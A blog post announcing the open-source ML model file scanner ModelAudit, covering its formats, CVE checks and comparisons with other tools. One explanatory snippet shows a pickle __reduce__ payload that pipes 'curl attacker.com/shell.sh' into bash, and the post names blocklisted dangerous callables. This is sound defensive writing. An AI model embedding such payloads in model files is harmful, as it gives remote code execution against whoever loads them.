---
title: 'Open-Sourcing ModelAudit: A Security Scanner for ML Model Files'
description: 'ModelAudit is now open source. It scans 30+ ML model formats for malicious code, known CVEs, and suspicious artifacts using static analysis. Here is why we built it and how it compares to existing tools.'
image: /img/docs/modelaudit/modelaudit-result.png
keywords:
  [
    ModelAudit,
    ML model security,
    AI supply chain security,
    model scanning,
    pickle security,
    malicious model detection,
    PyTorch vulnerability,
    ONNX security,
    open source security scanner,
    model file scanner,
    AI security tool,
    CVE detection ML models,
    machine learning security,
    model serialization attack,
    Hugging Face model scanning,
  ]
date: 2026-03-03
authors: [michael]
tags: [company-update, model-security, open-source, ai-security]
---

# Open-Sourcing ModelAudit: A Security Scanner for ML Model Files

Model files can execute code when loaded. ModelAudit scans them before that happens.

It is a static security scanner that inspects ML model files for malicious code, known CVEs, and suspicious artifacts across 30+ formats — without importing any ML framework or executing the model. We are releasing it today as an MIT-licensed open-source tool.

<!-- truncate -->

## Quick tour

```bash
$ pip install modelaudit
$ modelaudit suspicious_model.pkl

Scanning suspicious_model.pkl...

📊 SCAN SUMMARY
  Files: 1 | Duration: 0.29s
  Security Checks: ✅ 12 passed / ❌ 4 failed

🔍 SECURITY FINDINGS
  🚨 4 Critical

    └─ 🚨 [suspicious_model.pkl (pos 45)]
       Found REDUCE opcode with non-allowlisted global: posix.system
       Why: The REDUCE opcode calls a callable with arguments, effectively
           executing arbitrary Python functions. This is the primary
           mechanism for pickle-based code execution attacks.
       opcode: REDUCE
       associated_global: posix.system

    └─ 🚨 [suspicious_model.pkl (pos 45)]
       Detected dangerous __reduce__ pattern with posix.system
       pattern: RESOLVED_REDUCE_CALL_TARGET
       module: posix
       function: system

  ❌ CRITICAL SECURITY ISSUES FOUND
```

ModelAudit covers PyTorch, pickle, Keras, ONNX, TensorFlow SavedModel, GGUF, JAX/Flax, and [20+ other formats](https://www.promptfoo.dev/docs/model-audit/scanners/). Output formats include text, JSON, and [SARIF](https://sarifweb.azurewebsites.net/) for CI/CD integration. It runs on Python 3.10–3.13, Linux/macOS/Windows, with no required ML framework dependencies.

```bash
# Scan a directory
modelaudit ./models/

# Scan from Hugging Face
modelaudit hf://microsoft/DialoGPT-medium

# SARIF output for GitHub Code Scanning / GitLab SAST
modelaudit model.pt --format sarif --output results.sarif
```

Full documentation: [promptfoo.dev/docs/model-audit](https://www.promptfoo.dev/docs/model-audit/). Source: [github.com/promptfoo/modelaudit](https://github.com/promptfoo/modelaudit).

---

## Why this exists

When you `pip install` a package, you probably run it through a dependency scanner. When you download a model from Hugging Face and call `torch.load()`, what checks are you running?

For most teams, the answer is none. ML models are treated as data, but many model formats can execute code. A pickle file runs arbitrary Python on deserialization:

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell.sh | bash",))

pickle.dumps(Exploit())  # Executes on torch.load()
```

This is not a contrived scenario. [JFrog discovered over 400 models](https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/) on Hugging Face containing similar payloads. The attack surface extends beyond pickle:

- **PyTorch:** [CVE-2025-32434](https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6) (CVSS 9.3) showed that `weights_only=True` — the recommended mitigation — could be bypassed for remote code execution.
- **Keras:** [CVE-2025-1550](https://jfrog.com/blog/keras-safe_mode-bypass-vulnerability/) (CVSS 9.8) demonstrated that `safe_mode=True` could be circumvented via crafted archive configurations.
- **ONNX:** [CVE-2025-51480](https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-10877916) (CVSS 8.8) allowed arbitrary file overwrite via path traversal in external data references.
- **Supply chain:** [Palo Alto Unit42](https://unit42.paloaltonetworks.com/model-namespace-reuse/) documented attackers re-registering abandoned model namespaces to distribute malicious models under trusted names.

Hugging Face alone hosts over a million models. Most organizations pull from public registries without scanning what they download.

## The existing landscape

There are good tools in this space already. We use several of them ourselves, and ModelAudit builds on ideas from all of them.

### Picklescan

[Picklescan](https://github.com/mmaitre314/picklescan) deserves credit as the most widely deployed model scanner. It is [integrated into Hugging Face's scanning pipeline](https://huggingface.co/docs/hub/en/security-pickle) and has been the primary open-source defense for pickle-based attacks for years. It is fast, lightweight, and practical for automated scanning at scale.

Picklescan uses a blocklist approach: flag calls to known-dangerous functions (`os.system`, `subprocess.Popen`, etc.) in pickle bytecode. Blocklists are inherently reactive — they catch what is already known. In 2025, researchers found several bypass classes: file extension mismatches that evaded scanning, CRC error injection that disabled ZIP archive inspection, and DNS exfiltration via functions not on the blocklist ([JFrog](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/), [Sonatype](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities), [Cisco](https://blogs.cisco.com/ai/hardening-pickle-file-scanners)). These were fixed in subsequent releases. The pattern is not unique to picklescan — it is a structural limitation of any blocklist-based approach.

Picklescan focuses on pickle files. It does not cover ONNX, TensorFlow SavedModel, Keras, or other model formats.

### Fickling

[Fickling](https://github.com/trailofbits/fickling) by Trail of Bits is a research-grade pickle analysis tool. Its ability to decompile pickle streams into human-readable Python is valuable for manual analysis and incident response — something no other tool in this space does. In 2025, Trail of Bits added an [allowlist-based scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/) that inverts the blocklist model: block everything except known-safe imports, constructed from analysis of 3,000 real pickle files. In their evaluation, this caught 100% of malicious files with a 99% true-safe classification rate.

The allowlist approach is architecturally stronger than blocklisting for unknown threats. Fickling's scope is pickle-only, and it is designed primarily for analysis and research rather than CI/CD pipeline scanning.

### ModelScan

[ModelScan](https://github.com/protectai/modelscan) by ProtectAI was the first multi-format open-source scanner — a meaningful step forward from single-format tools. It covers H5 (Keras/TensorFlow), Pickle, and TensorFlow SavedModel using blocklist-based detection.

Production ML pipelines often use formats beyond those three — PyTorch ZIP archives, ONNX graphs, JAX/Flax checkpoints, GGUF, NeMo, PaddlePaddle, TensorRT. ProtectAI's commercial [Guardian](https://protectai.com/guardian) product covers 35+ formats; the open-source ModelScan covers three format families.

### Safetensors

[Safetensors](https://github.com/huggingface/safetensors) by Hugging Face takes the strongest possible approach: eliminate executable code from the format entirely. It stores only raw tensor data and metadata, is written in Rust, and was [independently audited](https://huggingface.co/blog/safetensors-security-audit) by Trail of Bits. If you can use safetensors, you should.

The practical constraint is that safetensors cannot represent everything: computational graphs, custom layers, optimizer state, and training metadata require other formats. According to a [study from Columbia, Brown, Purdue, Google, and Technion (CCS 2025)](https://cs.brown.edu/~vpk/papers/pickleball.ccs25.pdf), roughly 45% of popular Hugging Face models still use pickle. And the conversion pipeline itself can be a target — HiddenLayer demonstrated ["Silent Sabotage"](https://hiddenlayer.com/innovation-hub/silent-sabotage/) by injecting malicious code during Hugging Face's safetensors conversion process. Format migration and scanning are complementary strategies.

### Where ModelAudit fits

The gap is format coverage: no single open-source tool spans the full range of formats used in production, and none provide CVE-specific detection with structured attribution.

| Tool                  | Formats                | Approach                                | Static only | CVE rules | Output                |     Availability      |
| --------------------- | ---------------------- | --------------------------------------- | :---------: | :-------: | --------------------- | :-------------------: |
| Picklescan            | Pickle                 | Blocklist                               |     Yes     |    No     | Text                  |      Open source      |
| Fickling              | Pickle                 | Allowlist + decompiler                  |     Yes     |    No     | Text, JSON            |      Open source      |
| ModelScan             | Pickle, H5, SavedModel | Blocklist                               |     Yes     |    No     | JSON, console         |      Open source      |
| Safetensors           | N/A                    | Safe-by-design format                   |     N/A     |    N/A    | N/A                   |      Open source      |
| Guardian, HiddenLayer | 35+                    | Multi-method                            |   Varies    |    Yes    | Multiple              |      Commercial       |
| **ModelAudit**        | **30+**                | **Format-specific structural analysis** |   **Yes**   |  **Yes**  | **Text, JSON, SARIF** | **Open source (MIT)** |

ModelAudit is not a replacement for these tools. Teams already using picklescan or ModelScan can run ModelAudit alongside them — SARIF results from multiple tools aggregate in the same CI pipeline. Defense in depth applies to scanning too.

## How it works

### Parsing strategy

ModelAudit does not use a single scanning technique across all formats. Each scanner parses its format natively and checks invariants specific to that format's threat model.

A few examples:

- **Pickle:** Walks the opcode stream, reconstructs `STACK_GLOBAL` targets (which have `arg=None` in pickletools — the module and class must be resolved from preceding `SHORT_BINUNICODE`/`BINUNICODE` ops), tracks memoized references through `BINGET`/`LONG_BINGET`, and maps `REDUCE` calls to their actual callable targets. This catches evasion techniques like decoy strings and indirect global resolution that blocklist scanners miss.
- **ONNX:** Parses the protobuf graph structure, normalizes external data paths to detect path traversal ([CVE-2025-51480](https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-10877916)), and inspects custom operator definitions for suspicious patterns.
- **Keras:** Examines both H5 and ZIP archive variants. Checks archive members for embedded executables and configuration files for unsafe layer types (Lambda layers, custom objects). Extension checks are case-insensitive to catch renamed payloads.
- **NeMo:** Recursively inspects Hydra `_target_` configurations for callable injection ([CVE-2025-23304](https://nvd.nist.gov/vuln/detail/CVE-2025-23304)) against a blocklist of dangerous targets like `os.system`, `subprocess.call`, and `importlib.import_module`.
- **PyTorch ZIP:** Extracts pickle files from ZIP archives, runs the pickle scanner on each, then cross-references PyTorch version metadata from archive contents against known vulnerable versions.
- **Archives (ZIP, TAR, 7-Zip):** Checks for path traversal in member names, symlink attacks, and decompression bombs (zip bombs, tar bombs). Bounds member reads to 10 MB to prevent memory exhaustion.

Lower-risk formats get lighter analysis. The safetensors scanner validates structural integrity and checks metadata. The GGUF scanner inspects headers and metadata fields. The goal is to match analysis depth to actual threat level.

### CVE-specific detection

In addition to format-specific structural checks, ModelAudit includes targeted detection for 11 known CVEs. Each produces structured output with the CVE identifier, CVSS score, CWE mapping, a description of the vulnerability, and remediation steps.

Current coverage:

| CVE                                                                                                                                                                                   | Framework | CVSS | Description                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | ---- | ------------------------------------------------------ |
| [CVE-2025-32434](https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6)                                                                                          | PyTorch   | 9.3  | `weights_only=True` bypass, RCE via `torch.load()`     |
| [CVE-2026-24747](https://nvd.nist.gov/vuln/detail/CVE-2026-24747)                                                                                                                     | PyTorch   | 9.0  | SETITEM/SETITEMS abuse + tensor metadata mismatch      |
| [CVE-2022-45907](https://nvd.nist.gov/vuln/detail/CVE-2022-45907)                                                                                                                     | PyTorch   | 9.8  | JIT `parse_type_line` unsafe `eval()` injection        |
| [CVE-2024-5480](https://nvd.nist.gov/vuln/detail/CVE-2024-5480)                                                                                                                       | PyTorch   | 10.0 | RPC arbitrary function execution via PythonUDF         |
| [CVE-2024-48063](https://nvd.nist.gov/vuln/detail/CVE-2024-48063)                                                                                                                     | PyTorch   | 9.8  | RemoteModule deserialization RCE                       |
| [CVE-2019-6446](https://nvd.nist.gov/vuln/detail/CVE-2019-6446)                                                                                                                       | NumPy     | 9.8  | Object-dtype array RCE via `allow_pickle=True`         |
| [CVE-2025-23304](https://nvd.nist.gov/vuln/detail/CVE-2025-23304)                                                                                                                     | NeMo      | 7.6  | Hydra `_target_` injection in `.nemo` files            |
| [CVE-2025-51480](https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-10877916)                                                                                                             | ONNX      | 8.8  | `save_external_data` file overwrite via path traversal |
| [CVE-2025-54412](https://nvd.nist.gov/vuln/detail/CVE-2025-54412), [54413](https://nvd.nist.gov/vuln/detail/CVE-2025-54413), [54886](https://nvd.nist.gov/vuln/detail/CVE-2025-54886) | Skops     | —    | Serialization vulnerabilities                          |

### What "30+ scanners" means

This is not 30 copies of the same blocklist. Each scanner is purpose-built. Some are deep (pickle opcode analysis runs thousands of lines of code). Some are lighter (the safetensors scanner mostly validates integrity). The count includes archive scanners (ZIP, TAR, 7-Zip) and configuration scanners (manifests, Jinja2 templates) that apply across model formats.

Risk level in the table below reflects likelihood of code execution or file system impact during loading, not model capability or runtime behavior:

| Risk Level  | Formats                                                                                            |
| ----------- | -------------------------------------------------------------------------------------------------- |
| **High**    | Pickle, PyTorch (.pt/.pth/.ckpt/.bin), Joblib, NumPy, Skops                                        |
| **Medium**  | TensorFlow SavedModel, Keras (.h5/.keras), ONNX, XGBoost                                           |
| **Low**     | SafeTensors, GGUF/GGML, JAX/Flax, TFLite, ExecuTorch, TensorRT, PaddlePaddle, OpenVINO, PMML, NeMo |
| **Archive** | ZIP, TAR, 7-Zip, OCI layers                                                                        |
| **Config**  | Manifests, Jinja2 templates, metadata files                                                        |

Some "low" risk formats can carry higher risk when wrapped in archives or consumed by buggy loaders. The archive and config scanners apply across categories.

### Additional capabilities

- **SARIF output** — integrates with GitHub Code Scanning, GitLab SAST, and other platforms that consume [SARIF 2.1.0](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html).
- **SBOM generation** — produces [CycloneDX](https://cyclonedx.org/) bills of materials for model dependency tracking.
- **License detection** — identifies licenses via SPDX mapping, flags commercial-use restrictions (e.g., CC-BY-NC).
- **Secret detection** — finds API keys, tokens, and credentials embedded in model files or metadata.
- **Remote scanning** — pulls directly from S3, GCS, Hugging Face Hub, JFrog Artifactory, and MLflow registries.
- **Scan caching** — deduplicates by SHA-256 content hash to skip previously scanned files.

### Performance

ModelAudit scans local files in under a second for typical model sizes. The pickle scanner is the most compute-intensive component (opcode stream parsing, memoization tracking, pattern detection). For large files (>1 GB), streaming analysis bounds memory usage. Remote scanning speed depends on download bandwidth.

We have not published formal benchmarks yet. If this matters to your use case, we would appreciate [issues](https://github.com/promptfoo/modelaudit/issues) describing your workload.

## Limitations and non-goals

No scanner catches everything. We want to be specific about what ModelAudit does not do:

- **A clean scan is not proof of safety.** It means no known-malicious indicators were found. A novel attack that avoids all current detection patterns will pass undetected. This applies to every static analysis tool.
- **No runtime behavior analysis.** ModelAudit inspects file contents statically. It cannot detect payloads that only activate under specific runtime conditions (environment-triggered logic, timing-based attacks).
- **No adversarial robustness testing.** ModelAudit checks whether a model file is _safe to load_, not whether the model _produces correct outputs_ under adversarial conditions. For adversarial robustness, see [IBM ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox). For LLM red teaming, see [Promptfoo](https://www.promptfoo.dev/docs/red-team/).
- **No weight-level backdoor detection (yet).** We detect malicious code embedded in serialization (deserialization RCE, archive exploits, unsafe configurations). We do not yet detect backdoors hidden in tensor weight values. Techniques like [tensor steganography](https://labs.snyk.io/resources/tensor-steganography-and-ai-cybersecurity/) are an active research area that no current scanner addresses.
- **Detection depth varies by format.** High-risk formats get deep analysis. Lower-risk formats get structural validation. We prioritize depth where the threat model warrants it.
- **Failure modes exist.** Encrypted archives cannot be inspected beyond the container level. Malformed protobuf files may produce partial results. Truncated or corrupted files are flagged but may not be fully analyzed.

ModelAudit is one layer of defense. It works best alongside safe formats (safetensors where possible), provenance verification (signatures, checksums), and runtime controls (sandboxing, network egress filtering). The full [security model](https://www.promptfoo.dev/docs/model-audit/) is in the documentation.

## Data and privacy

ModelAudit makes **no network calls during local scans**. All analysis runs locally on the file bytes. When you use remote sources (`hf://`, `s3://`, etc.), ModelAudit downloads the file and scans it locally — nothing is uploaded to Promptfoo or any other service.

**Telemetry** is opt-out and collects only anonymous usage statistics: which CLI commands are run, which scanner and file types are encountered, scan duration and file counts. Model contents are never collected. Telemetry is automatically disabled in CI environments and development installs. To opt out:

```bash
export PROMPTFOO_DISABLE_TELEMETRY=1
# or
export NO_ANALYTICS=1
```

Scans are **deterministic**: identical input produces identical output.

## How ModelAudit fits into Promptfoo

ModelAudit started as an internal tool at [Promptfoo](https://www.promptfoo.dev/). While building Promptfoo's [AI red teaming](https://www.promptfoo.dev/docs/red-team/) and [code scanning](https://www.promptfoo.dev/code-scanning/) capabilities, we found a gap: we could test how an LLM application _behaves_ at runtime, but had no visibility into whether the _models themselves_ were safe to load.

If a model file triggers code execution on deserialization, runtime defenses are irrelevant — the compromise happens before the application starts. We needed model scanning as a prerequisite for everything else.

We initially built this as a capability within the Promptfoo platform ([promptfoo.dev/model-security](https://www.promptfoo.dev/model-security/)). ModelAudit is the standalone extraction of that scanning engine.

To be direct about the relationship: **every scanner, every CVE detection, and every output format is in the open-source repository.** There are no scanning features gated behind the Promptfoo platform. You do not need a Promptfoo account. The Promptfoo platform provides a UI, managed infrastructure, and integration with Promptfoo's other security products (red teaming, code scanning, monitoring). The scanning engine is the same code on GitHub.

## Why open source

There are commercial reasons to keep scanning capabilities proprietary — several companies in this space do. Here is why we chose not to.

**Auditable detection logic.** Every detection rule is readable source code. Security teams can verify what is being checked, assess whether the logic is sound, and extend it for their own needs. When a detection has a gap, external researchers can find and report it. The picklescan bypasses in 2025 were all discovered by external researchers. Open code does not prevent vulnerabilities, but it shortens the time to discovery and fix.

**Architectural diversity.** The ML security ecosystem benefits from multiple scanning approaches. Picklescan uses blocklists. Fickling uses allowlists. ModelAudit uses format-specific structural analysis and CVE-targeted detection. Each approach has different strengths and blind spots. Having them all available as open source means an adversary has to evade multiple independent detection strategies rather than one.

**Integration surface.** Model registries, CI/CD platforms, and MLOps tools all need scanning capabilities. Hugging Face [integrated picklescan](https://huggingface.co/docs/hub/en/security-pickle). GitHub consumes SARIF for code scanning alerts. MLflow and DVC could add pre-download scanning. A scanner with standardized output formats and an MIT license gives these platforms something they can build on without licensing constraints.

## Roadmap

Active development areas:

- **Expanding CVE coverage** for TensorFlow, Keras, and ONNX vulnerabilities
- **Weight distribution analysis** for detecting statistical anomalies that may indicate backdoors embedded in tensor values
- **Custom policy engine** for organizations to define their own scanning rules
- **Registry integrations** with MLflow, DVC, and other MLOps platforms
- **Published benchmarks** for scan speed, memory usage, and false positive rates across common model repositories

Contributions are welcome. See the [contribution guide](https://github.com/promptfoo/modelaudit/blob/main/CONTRIBUTING.md) and [open issues](https://github.com/promptfoo/modelaudit/issues) on GitHub.

To try it now:

```bash
pip install modelaudit
modelaudit your_model.pkl
```
